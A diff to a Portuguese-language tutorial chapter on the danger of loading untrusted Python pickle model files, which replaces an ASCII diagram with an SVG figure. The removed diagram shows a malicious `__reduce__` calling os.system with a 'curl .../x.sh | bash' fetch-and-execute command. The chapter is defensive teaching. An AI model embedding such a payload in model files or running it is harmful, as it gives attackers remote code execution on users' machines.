@@ -22,14 +22,7 @@ pode executar código, via o método mágico `__reduce__`, que diz ao Python "pa
 reconstruir este objeto, chame esta função com estes argumentos". Um atacante
 coloca ali qualquer função — inclusive `os.system`.
 
-```text
-   arquivo .pkl                         pickle.load()
-   +---------------------------+        +-------------------------+
-   | dados do "modelo" ...     |  --->  | reconstrucao do objeto  |
-   | __reduce__: os.system(    |        |  -> EXECUTA o comando   |
-   |    "curl .../x.sh | bash")|        |  -> RCE na sua maquina  |
-   +---------------------------+        +-------------------------+
-```
+![Figura 13.1 — Pickle armazena instruções de reconstrução e executa código via `__reduce__` ao carregar (RCE); Safetensors guarda só os pesos, sem execução.](imagens/fig-pickle.svg)
 
 Carregar um `.pkl` de origem não confiável é **equivalente a executar um script
 desconhecido** — o `pickle.load()` é, efetivamente, um `exec()` disfarçado de
